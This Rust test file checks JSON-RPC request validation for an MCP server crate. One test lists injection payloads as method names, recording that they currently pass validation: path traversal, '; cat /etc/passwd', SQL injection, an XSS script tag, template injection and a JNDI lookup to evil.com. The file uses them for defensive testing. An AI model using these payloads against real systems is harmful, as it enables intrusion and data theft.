//! Comprehensive unit tests for request validation

#[cfg(test)]
mod tests {
    use super::super::*;
    use pulseengine_mcp_protocol::{error::ErrorCode, Request};
    use serde_json::json;

    fn create_request(jsonrpc: &str, method: &str) -> Request {
        Request {
            jsonrpc: jsonrpc.to_string(),
            method: method.to_string(),
            params: json!({}),
            id: json!(1),
        }
    }

    #[test]
    fn test_validate_request_success() {
        let valid_requests = vec![
            create_request("2.0", "test_method"),
            create_request("2.0", "a"),
            create_request("2.0", "very_long_method_name_with_many_parts"),
            create_request("2.0", "method.with.dots"),
            create_request("2.0", "method-with-hyphens"),
            create_request("2.0", "methodWithCamelCase"),
            create_request("2.0", "method_123_numbers"),
        ];

        for request in valid_requests {
            let result = RequestValidator::validate_request(&request);
            assert!(
                result.is_ok(),
                "Request with method '{}' should be valid",
                request.method
            );
        }
    }

    #[test]
    fn test_validate_request_invalid_jsonrpc() {
        let invalid_versions = vec![
            "",
            "1.0",
            "2.1",
            "3.0",
            "2",
            "2.0.0",
            "v2.0",
            "jsonrpc-2.0",
            " 2.0",
            "2.0 ",
            "\n2.0",
        ];

        for version in invalid_versions {
            let request = create_request(version, "test_method");
            let result = RequestValidator::validate_request(&request);

            assert!(result.is_err(), "Version '{}' should be invalid", version);

            let error = result.unwrap_err();
            assert_eq!(error.code, ErrorCode::InvalidRequest);
            assert!(error.message.contains("Invalid JSON-RPC version"));
            assert!(error.message.contains("2.0"));
        }
    }

    #[test]
    fn test_validate_request_empty_method() {
        let request = create_request("2.0", "");
        let result = RequestValidator::validate_request(&request);

        assert!(result.is_err());

        let error = result.unwrap_err();
        assert_eq!(error.code, ErrorCode::InvalidRequest);
        assert!(error.message.contains("Method cannot be empty"));
    }

    #[test]
    fn test_validate_request_whitespace_method() {
        let whitespace_methods = vec![" ", "  ", "\t", "\n", "\r\n", " \t\n "];

        for method in whitespace_methods {
            let mut request = create_request("2.0", "valid");
            request.method = method.to_string();

            let result = RequestValidator::validate_request(&request);
            // Note: Currently whitespace is not trimmed, so these are "valid"
            // You might want to add trimming in the implementation
            assert!(
                result.is_ok(),
                "Whitespace method '{}' behavior should be documented",
                method.escape_debug()
            );
        }
    }

    #[test]
    fn test_validate_request_unicode_methods() {
        let unicode_methods = vec![
            "методРусский",
            "方法中文",
            "μέθοδος",
            "🎉celebration",
            "emoji_🚀_method",
        ];

        for method in unicode_methods {
            let request = create_request("2.0", method);
            let result = RequestValidator::validate_request(&request);

            // Currently these pass validation
            assert!(
                result.is_ok(),
                "Unicode method '{}' should be handled consistently",
                method
            );
        }
    }

    #[test]
    fn test_validate_request_special_characters() {
        // These contain special characters that might need validation
        let special_methods = vec![
            "method/with/slashes",
            "method\\with\\backslashes",
            "method:with:colons",
            "method;with;semicolons",
            "method?with?questions",
            "method!with!exclamations",
            "method@with@at",
            "method#with#hash",
            "method$with$dollar",
            "method%with%percent",
            "method&with&ampersand",
            "method*with*asterisk",
            "method(with)parens",
            "method[with]brackets",
            "method{with}braces",
            "method<with>angles",
            "method|with|pipe",
            "method\"with\"quotes",
            "method'with'quotes",
            "method`with`backticks",
            "method~with~tilde",
            "method^with^caret",
            "method=with=equals",
            "method+with+plus",
        ];

        for method in special_methods {
            let request = create_request("2.0", method);
            let result = RequestValidator::validate_request(&request);

            // Document current behavior - these currently pass
            assert!(
                result.is_ok(),
                "Special character method '{}' validation behavior should be documented",
                method
            );
        }
    }

    #[test]
    fn test_validate_request_injection_attempts() {
        // Potential injection payloads
        let injection_methods = vec![
            "../../../etc/passwd",
            "../../..\\..\\..\\..",
            "; cat /etc/passwd",
            "' OR '1'='1",
            "\"; DROP TABLE users; --",
            "<script>alert('xss')</script>",
            "{{7*7}}",
            "${jndi:ldap://evil.com/a}",
            "method\0with\0null",
            "method\nwith\nnewline\ninjection",
            "method\rwith\rcarriage\rreturn",
        ];

        for method in injection_methods {
            let request = create_request("2.0", method);
            let result = RequestValidator::validate_request(&request);

            // Currently these pass basic validation
            // More sophisticated validation might reject these
            assert!(
                result.is_ok(),
                "Injection attempt '{}' currently passes basic validation",
                method.escape_debug()
            );
        }
    }

    #[test]
    fn test_validate_request_extreme_lengths() {
        // Very long method name
        let long_method = "a".repeat(10000);
        let long_request = create_request("2.0", &long_method);
        let result = RequestValidator::validate_request(&long_request);

        // Currently passes - might want length limits
        assert!(result.is_ok(), "Very long method names should be handled");

        // Single character method
        let short_request = create_request("2.0", "x");
        assert!(RequestValidator::validate_request(&short_request).is_ok());
    }

    #[test]
    fn test_validate_request_with_different_params() {
        // Test that params don't affect validation
        let params_variants = vec![
            json!(null),
            json!({}),
            json!([]),
            json!({"key": "value"}),
            json!([1, 2, 3]),
            json!("string param"),
            json!(42),
            json!(true),
        ];

        for params in params_variants {
            let mut request = create_request("2.0", "test_method");
            request.params = params.clone();

            let result = RequestValidator::validate_request(&request);
            assert!(
                result.is_ok(),
                "Params {:?} should not affect validation",
                params
            );
        }
    }

    #[test]
    fn test_validate_request_with_different_ids() {
        // Test that id doesn't affect validation
        let id_variants = vec![
            json!(1),
            json!("string-id"),
            json!(null),
            json!(true),
            json!([1, 2, 3]),
            json!({"complex": "id"}),
        ];

        for id in id_variants {
            let mut request = create_request("2.0", "test_method");
            request.id = id.clone();

            let result = RequestValidator::validate_request(&request);
            assert!(result.is_ok(), "ID {:?} should not affect validation", id);
        }
    }

    #[test]
    fn test_error_format() {
        // Test invalid version error format
        let request1 = create_request("1.0", "test");
        let error1 = RequestValidator::validate_request(&request1).unwrap_err();
        assert!(error1.message.contains("JSON-RPC"));
        assert!(error1.message.contains("2.0"));
        assert_eq!(error1.code, ErrorCode::InvalidRequest);

        // Test empty method error format
        let request2 = create_request("2.0", "");
        let error2 = RequestValidator::validate_request(&request2).unwrap_err();
        assert!(error2.message.contains("Method"));
        assert!(error2.message.contains("empty"));
        assert_eq!(error2.code, ErrorCode::InvalidRequest);
    }

    #[test]
    fn test_case_sensitive_jsonrpc_version() {
        // JSON-RPC version should be case sensitive
        let case_variants = vec![
            "2.0",   // Valid
            "2.O",   // Letter O instead of zero
            "2,0",   // Comma instead of dot
            "２.０", // Full-width characters
        ];

        for (i, version) in case_variants.iter().enumerate() {
            let request = create_request(version, "test");
            let result = RequestValidator::validate_request(&request);

            if i == 0 {
                assert!(result.is_ok(), "Version '{}' should be valid", version);
            } else {
                assert!(result.is_err(), "Version '{}' should be invalid", version);
            }
        }
    }
}
